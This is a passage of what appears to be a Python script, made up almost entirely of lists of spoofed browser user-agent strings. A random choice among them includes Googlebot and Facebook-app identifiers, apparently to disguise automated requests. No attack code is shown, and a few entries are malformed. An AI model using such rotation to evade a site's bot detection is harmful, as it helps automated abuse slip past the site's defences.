(KHTML, like Gecko) Chrome/88.0.4324.93 Mobile Safari/537.36', 'Mozilla/5.0 (Linux; Android 8.1.0; en-au; SAMSUNG SM-M105F) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/75.0.3770.143 Mobile Safari/537.36', 'Mozilla/5.0 (Linux; Android 8.0.0; en-au; SAMSUNG SM-G960W) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/75.0.3770.143 Mobile Safari/537.36', 'Mozilla/5.0 (Linux; Android 8.0.0; en-au; SAMSUNG SM-A520F/A520FXXUGCTI9) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/75.0.3770.143 Mobile Safari/537.36', 'Mozilla/5.0 (Linux; Android 7.0; en-au; SAMSUNG SM-G935W8) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/75.0.3770.143 Mobile Safari/537.36', 'Mozilla/5.0 (Linux; Android 7.0; en-au; SAMSUNG SM-C7000) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/75.0.3770.143 Mobile Safari/537.36', 'Mozilla/5.0 (Linux; Android 7.0; en-au; SAMSUNG SM-A310F/A310FXXS5CTK1) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/75.0.3770.143 Mobile Safari/537.36', 'Mozilla/5.0 (Linux; Android 6.0.1; en-au; SAMSUNG SM-T805M) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/75.0.3770.143 Safari/537.36', 'Mozilla/5.0 (Linux; Android 6.0.1; en-au; SAMSUNG SM-G900F) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/86.0.4240.75 Mobile Safari/537.36', 'Mozilla/5.0 (Linux; Android 11; en-au;SAMSUNG SM-N9750) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/75.0.3770.143 Mobile Safari/537.36', 'Mozilla/5.0 (Linux; Android 11; en-au;SAMSUNG SM-N975F) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/75.0.3770.143 Mobile Safari/537.36', 'Mozilla/5.0 (Linux; Android 11; en-au; SAMSUNG SM-G988B) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/75.0.3770.143 Mobile Safari/537.36', 'Mozilla/5.0 (Linux; Android 11; en-au; SAMSUNG SM-G973F) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/75.0.3770.143 Mobile Safari/537.36', 'Mozilla/5.0 (Linux; Android 11; en-au; SAMSUNG SM-A405FN) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/75.0.3770.143 Mobile Safari/537.36', 'Mozilla/5.0 (Linux; Android 11; en-au; SAMSUNG SM-N975F) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/75.0.3770.143 Mobile Safari/537.36', 'Mozilla/5.0 (Linux; Android 11; en-au; SAMSUNG SM-G988B) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/75.0.3770.143 Mobile Safari/537.36', 'Mozilla/5.0 (Linux; Android 11; en-au; SAMSUNG SM-G973F) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/75.0.3770.143 Mobile Safari/537.36', 'Mozilla/5.0 (Linux; Android 11; en-au; SAMSUNG SM-A405FN) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/75.0.3770.143 Mobile Safari/537.36', 'Mozilla/5.0 (Linux; Android 10; en-au; SAMSUNG SM-T295) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/75.0.3770.143 Safari/537.36', 'Mozilla/5.0 (Linux; Android 10; en-au; SAMSUNG SM-T290) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/75.0.3770.143 Safari/537.36', 'Mozilla/5.0 (Linux; Android 10; en-au; SAMSUNG SM-M205F) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/75.0.3770.143 Mobile Safari/537.36', 'Mozilla/5.0 (Linux; Android 10; en-au; SAMSUNG SM-J600GT) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/75.0.3770.143 Mobile Safari/537.36', 'Mozilla/5.0 (Linux; Android 10; en-au; SAMSUNG SM-G398FN) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/75.0.3770.143 Mobile Safari/537.36', 'Mozilla/5.0 (Linux; Android 10; en-au; SAMSUNG SM-A600G) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/75.0.3770.143 Mobile Safari/537.36', 'Mozilla/5.0 (Linux; Android 10; en-au; SAMSUNG SM-A505FN/A505FNXXS5BTI9) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/75.0.3770.143 Mobile Safari/537.36', 'Mozilla/5.0 (Linux; Android 10; en-au; SAMSUNG SM-A205FN) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/75.0.3770.143 Mobile Safari/537.36', 'Mozilla/5.0 (Linux; Android 10; en-au; SAMSUNG SM-A202F/A202FXXU3BTK2) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/75.0.3770.143 Mobile Safari/537.36', 'Mozilla/5.0 (Linux; Android 10; en-au; SAMSUNG SM-A105FN/A105FNXXU4BTI2) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/75.0.3770.143 Mobile Safari/537.36', 'Mozilla/5.0 (Linux; Android 10; en-au; SAMSUNG SM-A105F) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/75.0.3770.143 Mobile Safari/537.36', 'Mozilla/5.0 (Linux; Android 9; en-au; SAMSUNG SM-G955F/G955FXXU9DTF1) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/75.0.3770.143 Mobile Safari/537.36', 'Mozilla/5.0 (Linux; Android 9; en-au; SAMSUNG SM-A705FN/A705FNXXU3ASG6) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/75.0.3770.143 Mobile Safari/537.36', 'Mozilla/5.0 (Linux; Android 9; en-au; SAMSUNG SM-A705FN) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/87.0.4280.66 Mobile Safari/537.36', 'Mozilla/5.0 (Linux; Android 8.1.0; en-au; SAMSUNG SM-J530F/J530FXXS5BSE3) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/75.0.3770.143 Mobile Safari/537.36', 'Mozilla/5.0 (Linux; Android 8.0.0; en-au; SAMSUNG SM-G935T) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/86.0.4240.99 Mobile Safari/537.36', 'Mozilla/5.0 (Linux; Android 7.1.1; en-au; SAMSUNG SM-J250F) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/87.0.4252.0 Mobile Safari/537.36', 'Mozilla/5.0 (Linux; Android 6.0.1; en-au; SAMSUNG SM-A8000) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/75.0.3770.143 Mobile Safari/537.36', 'Mozilla/5.0 (Linux; Android 5.1.1; en-au; SAMSUNG SM-A51) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/75.0.3770.143 Mobile Safari/537.36', 'Mozilla/5.0 (Linux; Android 11; en-au; SAMSUNG SM-P610) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/75.0.3770.143 Safari/537.36', 'Mozilla/5.0 (Linux; Android 11; en-au; SAMSUNG SM-M315F) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/75.0.3770.143 Mobile Safari/537.36', 'Mozilla/5.0 (Linux; Android 11; en-au; SAMSUNG SM-M307F) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/75.0.3770.143 Mobile Safari/537.36', 'Mozilla/5.0 (Linux; Android 10; en-au; SAMSUNG SM-S215DL) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/75.0.3770.143 Safari/537.36', 'Mozilla/5.0 (Linux; Android 10; en-au; SAMSUNG SM-P205) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/75.0.3770.143 Safari/537.36', 'Mozilla/5.0 (Linux; Android 10; en-au; SAMSUNG SM-M115F) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/75.0.3770.143 Mobile Safari/537.36', 'Mozilla/5.0 (Linux; Android 10; en-au; SAMSUNG SM-M015G) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/75.0.3770.143 Mobile Safari/537.36', 'Mozilla/5.0 (Linux; Android 10; en-au; SAMSUNG SM-J600FN) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/75.0.3770.143 Mobile Safari/537.36', 'Mozilla/5.0 (Linux; Android 10; en-au; SAMSUNG SM-G988B) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/75.0.3770.143 Mobile Safari/537.36', 'Mozilla/5.0 (Linux; Android 10; en-au; SAMSUNG SM-A750F) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/75.0.3770.143 Mobile Safari/537.36', 'Mozilla/5.0 (Linux; Android 10; en-au; SAMSUNG SM-A600A) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/75.0.3770.143 Mobile Safari/537.36', 'Mozilla/5.0 (Linux; Android 10; en-au; SAMSUNG SM-A515U) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/75.0.3770.143 Mobile Safari/537.36', 'Mozilla/5.0 (Linux; Android 10; en-au; SAMSUNG SM-A415F/A415FXXU1ATE1) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/75.0.3770.143 Mobile Safari/537.36', 'Mozilla/5.0 (Linux; Android 10; en-au; SAMSUNG SM-A315F) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/75.0.3770.143 Mobile Safari/537.36', 'Mozilla/5.0 (Linux; Android 10; en-au; SAMSUNG SM-A307FN) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/75.0.3770.143 Mobile Safari/537.36', 'Mozilla/5.0 (Linux; Android 10; en-au; SAMSUNG SM-A217M) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/75.0.3770.143 Mobile Safari/537.36', 'Mozilla/5.0 (Linux; Android 10; en-au; SAMSUNG SM-A215U) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/75.0.3770.143 Safari/537.36', 'Mozilla/5.0 (Linux; Android 10; en-au; SAMSUNG SM-A205W) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/75.0.3770.143 Mobile Safari/537.36', 'Mozilla/5.0 (Linux; Android 10; en-au; SAMSUNG SM-A125F/A125FXXU1ATL4) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/75.0.3770.143 Mobile Safari/537.36', 'Mozilla/5.0 (Linux; Android 10; en-au; SAMSUNG SM-A115AZ) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/75.0.3770.143 Mobile Safari/537.36', 'Mozilla/5.0 (Linux; Android 10; en-au; SAMSUNG SM-A107M) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/75.0.3770.143 Mobile Safari/537.36', 'Mozilla/5.0 (Linux; Android 10; en-au; SAMSUNG SM-A025G) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/75.0.3770.143 Mobile Safari/537.36', 'Mozilla/5.0 (Linux; Android 10; en-au; SAMSUNG SM-A015T1) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/75.0.3770.143 Mobile Safari/537.36', 'Mozilla/5.0 (Linux; Android 10; en-au; SAMSUNG SM-T865) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/71.0.3578.99 Safari/537.36', 'Mozilla/5.0 (Linux; Android 10; en-au; SAMSUNG SM-T595) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/71.0.3578.99 Safari/537.36', 'Mozilla/5.0 (Linux; Android 10; en-au; SAMSUNG SM-T510) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/71.0.3578.99 Safari/537.36', 'Mozilla/5.0 (Linux; Android 10; en-au; SAMSUNG SM-M305M) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/71.0.3578.99 Mobile Safari/537.36', 'Mozilla/5.0 (Linux; Android 10; en-au; SAMSUNG SM-G970F/G970FXXU8DTH7) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/71.0.3578.99 Mobile Safari/537.36', 'Mozilla/5.0 (Linux; Android 10; en-au; SAMSUNG SM-A3050) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/71.0.3578.99 Mobile Safari/537.36', 'Mozilla/5.0 (Linux; Android 10; en-au; SAMSUNG SM-A605K/KKU3CTF2) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/71.0.3578.99 Mobile Safari/537.36', 'Mozilla/5.0 (Linux; Android 10; en-au; SAMSUNG SM-A505GN) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/71.0.3578.99 Mobile Safari/537.36', 'Mozilla/5.0 (Linux; Android 9; en-au; SAMSUNG SM-G955F/G955FXXSBDTJ1) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/71.0.3578.99 Mobile Safari/537.36', 'Mozilla/5.0 (Linux; Android 8.1.0; en-au; SAMSUNG SM-T385) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/71.0.3578.99 Mobile Safari/537.36', 'Mozilla/5.0 (Linux; Android 8.0.0; en-au; SAMSUNG SM-G970U) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/71.0.3578.99 Mobile Safari/537.36', 'Mozilla/5.0 (Linux; Android 8.0.0; en-au; SAMSUNG SM-A520F/A520FXXSFCTG8) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/71.0.3578.99 Mobile Safari/537.36', 'Mozilla/5.0 (Linux; Android 7.0; en-au; SAMSUNG SM-A510F/A510FXXU7CRL2) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/71.0.3578.99 Mobile Safari/537.36', 'Mozilla/5.0 (Linux; Android 6.0.1; en-au; SAMSUNG SM-G906K/KTU1CPL1) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/71.0.3578.99 Mobile Safari/537.36', 'Mozilla/5.0 (Linux; Android 6.0.1; en-au; SAMSUNG SM-A700FD) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/88.0.4324.93 Mobile Safari/537.36', 'Mozilla/5.0 (Linux; Android 5.1.1; en-au; SAMSUNG SM-T287) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/71.0.3578.99 Safari/537.36', 'Mozilla/5.0 (Linux; Android 9; en-au; SAMSUNG SM-G955U) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/71.0.3578.99 Mobile Safari/537.36', 'Mozilla/5.0 (Linux; Android 9; en-au; SAMSUNG SM-G955U) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/71.0.3578.99 Mobile Safari/537.36', 'Mozilla/5.0 (Linux; Android 10; en-au; SAMSUNG SM-N9750) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/71.0.3578.99 Mobile Safari/537.36', 'Mozilla/5.0 (Linux; Android 10; en-au; SAMSUNG SM-M105F) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/71.0.3578.99 Mobile Safari/537.36', 'Mozilla/5.0 (Linux; Android 10; en-au; SAMSUNG SM-J810M) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/71.0.3578.99 Mobile Safari/537.36', 'Mozilla/5.0 (Linux; Android 10; en-au; SAMSUNG SM-J810F) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/71.0.3578.99 Mobile Safari/537.36', 'Mozilla/5.0 (Linux; Android 10; en-au; SAMSUNG SM-J610FN) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/71.0.3578.99 Mobile Safari/537.36', 'Mozilla/5.0 (Linux; Android 10; en-au; SAMSUNG SM-A707F) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/71.0.3578.99 Mobile Safari/537.36', 'Mozilla/5.0 (Linux; Android 10; en-au; SAMSUNG SM-A705FN/A705FNXXU5BTJ4) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/71.0.3578.99 Mobile Safari/537.36', 'Mozilla/5.0 (Linux; Android 10; en-au; SAMSUNG SM-A305GN) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/71.0.3578.99 Mobile Safari/537.36', 'Mozilla/5.0 (Linux; Android 9; en-au; SAMSUNG SM-G970F/G970FXXU3ASJD) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/71.0.3578.99 Mobile Safari/537.36', 'Mozilla/5.0 (Linux; Android 9; en-au; Redmi 7A) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/71.0.3578.99 Mobile Safari/537.36', 'Mozilla/5.0 (Linux; Android 10; en-au; SAMSUNG SM-J600GT Build/QP1A.190711.020) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/59.0.3071.125 Mobile Safari/537.36', 'Mozilla/5.0 (Linux; Android 10; en-au; SAMSUNG SM-A750GN Build/QP1A.190711.020) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/59.0.3071.125 Mobile Safari/537.36', 'Mozilla/5.0 (Linux; Android 9; en-au; SAMSUNG SM-N950N Build/PPR1.180610.011) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/59.0.3071.125 Mobile Safari/537.36', 'Mozilla/5.0 (Linux; Android 9; en-au; SAMSUNG SM-J415FN/J415FNXXU2BSDL Build/PPR1.180610.011) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/59.0.3071.125 Mobile Safari/537.36', 'Mozilla/5.0 (Linux; Android 8.1.0; en-au; SAMSUNG SM-J730GM Build/M1AJQ) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/59.0.3071.125 Mobile Safari/537.36', 'Mozilla/5.0 (Linux; Android 8.0.0; en-au; SAMSUNG SM-N950N/KSU4CRJ2 Build/R16NW) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/59.0.3071.125 Mobile Safari/537.36', 'Mozilla/5.0 (Linux; Android 8.0.0; en-au; SAMSUNG SM-J720M Build/R16NW) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/59.0.3071.125 Mobile Safari/537.36', 'Mozilla/5.0 (Linux; Android 8.0.0; en-au; SAMSUNG SM-G930VL Build/R16NW) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/59.0.3071.125 Mobile Safari/537.36', 'Mozilla/5.0 (Linux; Android 8.0.0; en-au; SAMSUNG SM-G930R6 Build/R16NW) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/59.0.3071.125 Mobile Safari/537.36', 'Mozilla/5.0 (Linux; Android 8.0.0; en-au; SAMSUNG SM-A520S Build/R16NW) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/59.0.3071.125 Mobile Safari/537.36', 'Mozilla/5.0 (Linux; Android 8.0.0; en-au; SAMSUNG SM-A320Y Build/R16NW) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/59.0.3071.125 Mobile Safari/537.36', 'Mozilla/5.0 (Linux; Android 7.0; en-au; SAMSUNG SM-T825 Build/NRD90M) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/59.0.3071.125 Safari/537.36', 'Mozilla/5.0 (Linux; Android 7.0; en-au; SAMSUNG SM-J727R4 Build/NRD90M) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/59.0.3071.125 Mobile Safari/537.36', 'Mozilla/5.0 (Linux; Android 7.0; en-au; SAMSUNG SM-G928T Build/NRD90M) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/59.0.3071.125 Mobile Safari/537.36', 'Mozilla/5.0 (Linux; Android 6.0.1; en-au; SAMSUNG SM-N915S Build/MMB29K) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/59.0.3071.125 Mobile Safari/537.36', 'Mozilla/5.0 (Linux; Android 5.1.1; en-au; SAMSUNG SM-G900T Build/LMY47X) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/59.0.3071.125 Mobile Safari/537.36', 'Mozilla/5.0 (Linux; Android 5.0.1; en-au; SAMSUNG SGH-M919V Build/LRX22C) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/59.0.3071.125 Mobile Safari/537.36', 'Mozilla/5.0 (Linux; Android 6.0.1; en-au; SAMSUNG SM-J500M Build/MMB29M) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/59.0.3071.125 Mobile Safari/537.36', 'Mozilla/5.0 (Linux;Android 7.0; en-au; SAMSUNG SM-T830 Build/NRD90M) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/86.0.4240.111 Mobile Safari/537.36', 'Mozilla/5.0 (Linux;Android 7.0; en-au; SAMSUNG SM-T830 Build/NRD90M) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/84.0.4147.89 Mobile Safari/537.36', 'Mozilla/5.0 (Linux; Android 9; en-au; SAMSUNG SM-J720F Build/PPR1.180610.011) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/59.0.3071.125 Mobile Safa', 'Mozilla/5.0 (Linux; Android 9; en-au; SAMSUNG SM-G960F/G960FXXU7CSJ1 Build/PPR1.180610.011) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/59.0.3071.125 Mobile Safari/537.36', 'Mozilla/5.0 (Linux; Android 9; en-au; SAMSUNG SM-G960F/G960FXXU7CSJ1 Build/PPR1.180610.011) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/59.0.3071.125 Mobile Safari/537.36', 'Mozilla/5.0 (Linux; Android 9; en-au; SAMSUNG SM-A605FN Build/PPR1.180610.011) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/59.0.3071.125 Mobile Safari/537.36', 'Mozilla/5.0 (Linux; Android 9; en-au; SAMSUNG SM-A600FN/A600FNXXU3BSD2 Build/PPR1.180610.011) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/59.0.3071.125 Mobile Safari/537.36', 'Mozilla/5.0 (Linux; Android 8.1.0; en-au; SAMSUNG SM-T587 Build/M1AJQ) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/59.0.3071.125 Safari/537.36', 'Mozilla/5.0 (Linux; Android 8.1.0; en-au; SAMSUNG SM-P580 Build/M1AJQ) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/59.0.3071.125 Safari/537.36', 'Mozilla/5.0 (Linux; Android 8.1.0; en-au; SAMSUNG SM-G615FU Build/M1AJQ) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/59.0.3071.125 Mobile Safari/537.36', 'Mozilla/5.0 (Linux; Android 8.1.0; en-au; SAMSUNG SM-G610M Build/M1AJQ) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/59.0.3071.125 Mobile Safari/537.36', 'Mozilla/5.0 (Linux; Android 8.1.0; en-au; SAMSUNG SM-G390F Build/M1AJQ) AppleWebKit/537.36 (KHTML, like Gecko) SamsungBrowser/7.2 Chrome/59.0.3071.125 Mobile Safari/537.36', 'Mozilla/5.0 (Linux; Android 8.0.0; en-au; SAMSUNG SM-J600FN/J600FNXXU3ASC1 Build/R16NW) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/59.0.3071.125 Mobile Safari/537.36', 'Mozilla/5.0 (Linux; Android 8.0.0; en-au; SAMSUNG SM-G950F/G950FXXS4CRLC Build/R16NW) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/59.0.3071.125 Mobile Safari/537.36', 'Mozilla/5.0 (Linux; Android 8.0.0; en-au; SAMSUNG SM-G891A Build/R16NW) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/59.0.3071.125 Mobile Safari/537.36', 'Mozilla/5.0 (Linux; Android 8.0.0; en-au; SAMSUNG SM-G570M Build/R16NW) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/59.0.3071.125 Mobile Safari/537.36', 'Mozilla/5.0 (Linux; Android 8.0.0; en-au; SAMSUNG SM-C5000 Build/R16NW) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/59.0.3071.125 Mobile Safari/537.36', 'Mozilla/5.0 (Linux; Android 8.0.0; en-au; SAMSUNG SM-A910F Build/R16NW) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/59.0.3071.125 Mobile Safari/537.36', 'Mozilla/5.0 (Linux; Android 7.1.1; en-au; SAMSUNG SM-T385 Build/NMF26X) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/59.0.3071.125 Safari/537.36', 'Mozilla/5.0 (Linux; Android 7.1.1; en-au; SAMSUNG SM-T355 Build/NMF26X) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/59.0.3071.125 Mobile Safari/537.36', 'Mozilla/5.0 (Linux; Android 10; en-au; SAMSUNG SM-J400F Build/QP1A.190711.020) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/59.0.3071.125 Mobile Safari/537.36', 'Mozilla/5.0 (Linux; Android 10; en-au; SAMSUNG SM-G965F Build/QP1A.190711.020) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/59.0.3071.125 Mobile Safari/537.36', 'Mozilla/5.0 (Linux; Android 10; en-au; SAMSUNG SM-G960F Build/QP1A.190711.020) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/59.0.3071.125 Mobile Safari/537.36', 'Mozilla/5.0 (Linux; Android 9; en-au; SAMSUNG SM-J810Y Build/PPR1.180610.011) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/59.0.3071.125 Mobile Safari/537.36', 'Mozilla/5.0 (Linux; Android 9; en-au; SAMSUNG SM-J810F Build/PPR1.180610.011) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/59.0.3071.125 Mobile Safari/537.36', 'Mozilla/5.0 (Linux; Android 9; en-au; SAMSUNG SM-J600FN Build/PPR1.180610.011) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/59.0.3071.125 Mobile Safari/537.36', 'Mozilla/5.0 (Linux; Android 9.0.0; en-au; SAMSUNG SM-GT9001 Build/R18NW) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/59.0.3071.125 Mobile Safari/537.36']

###-------[RANDOM USER AGENT]-------###
ua = random.choice(['Mozilla/5.0 (Linux; Android 7.1.2; Redmi 4A) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/97.0.4692.87 Mobile Safari/537.36',
'Mozilla/5.0 (Linux; Android 10; SM-G996U Build/QP1A.190711.020; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Mobile Safari/537.36',
'Mozilla/5.0 (Linux; Android 10; SM-G980F Build/QP1A.190711.020; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/78.0.3904.96 Mobile Safari/537.36',
'Mozilla/5.0 (Linux; Android 6.0; iCherry C233 Build/MRA58K) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/56.0.2924.87 Mobile Safari/537.36',
'Mozilla/5.0 (X11; Ubuntu; Linux x86_64; rv:15.0) Gecko/20100101 Firefox/15.0.1','Mozilla/5.0 (iPhone; CPU iPhone OS 12_2 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/12.1 Mobile/15E148 Safari/604.1',
'Mozilla/5.0 (compatible; Googlebot/2.1; +http://www.google.com/bot.html)',
'Mozilla/5.0 (Linux; Android 10; Mi 9T Pro Build/QKQ1.190825.002; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/88.0.4324.181 Mobile Safari/537.36[FBAN/EMA;FBLC/it_IT;FBAV/239.0.0.10.109;]',
'Mozilla/5.0 (Linux; Android 4.4.4; en-au; SAMSUNG SM-N915G Build/KTU84P) AppleWebKit/537.36 (KTHML, like Gecko) Version/2.0 Chrome/34.0.1847.76 Mobile Safari/537.36","Mozilla/5.0 (Linux; Android 4.1.2; Nokia_X Build/JZO54K) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/27.0.87.90 Mobile Safari/537.36 NokiaBrowser/1.0,gzip(gfe)',
'Mozilla/5.0 (Linux; U; Android 4.4.2; zh-CN; HUAWEI MT7-TL00 Build/HuaweiMT7-TL00) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/40.0.2214.89 UCBrowser/11.3.8.909 Mobile Safari/537.36","Mozilla/5.0 (Linux; Android 10; M2006C3MG) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/81.0.4044.138 Mobile Safari/537.36',
'Mozilla/5.0 (Linux; Android 7.0; SM-G930VC Build/NRD90M; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/58.0.3029.83 Mobile Safari/537.36'])
'Mozilla/5.0 (Linux; Android 9; SAMSUNG SM-E5260) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/96.0.4438.149 Mobile Safari/537.36'
rua = random.choice([
			"Dalvik/1.6.0 (Linux; U; Android 4.4.2; NX55 Build/KOT5506) [FBAN/FB4A;FBAV/106.0.0.26.68;FBBV/45904160;FBDM/{density=3.0,width=1080,height=1920};FBLC/it_IT;FBRV/45904160;FBCR/PosteMobile;FBMF/asus;FBBD/asus;FBPN/com.facebook.katana;FBDV/ASUS_Z007;FBSV/5.0;FBOP/1;FBCA/x86:armeabi-v7a;]",
			  "Mozilla/4.0 (compatible; MSIE 7.0; Windows NT 5.1; WOW64; Trident/4.0; SLCC2; .NET CLR 2.0.50727; .NET CLR 3.5.30729; .NET CLR 3.0.30729; .NET4.0C; .NET4.0E)",
  "Mozilla/4.0 (compatible; MSIE 7.0; Windows NT 6.1; WOW64; Trident/7.0; SLCC2; .NET CLR 2.0.50727; .NET CLR 3.5.30729; .NET CLR 3.0.30729; Media Center PC 6.0; .NET4.0C; .NET4.0E)",
  "Mozilla/4.0 (compatible; MSIE 7.0; Windows NT 6.1; WOW64; Trident/7.0; SLCC2; .NET CLR 2.0.50727; .NET CLR 3.5.30729; .NET CLR 3.0.30729; Media Center PC 6.0; CMDTDF; .NET4.0C; .NET4.0E; GWX:QUALIFIED)",
  "Mozilla/5.0 (Windows NT 6.1; Win64; x64; rv:40.0) Gecko/20100101 Firefox/40.0.2 Waterfox/40.0.2",
  "Mozilla/5.0 (Linux; Android 5.0; SAMSUNG SM-N900T Build/LRX21V) AppleWebKit/537.36 (KHTML, like Gecko) SamsungBrowser/2.1 Chrome/34.0.1847.76 Mobile Safari/537.36",
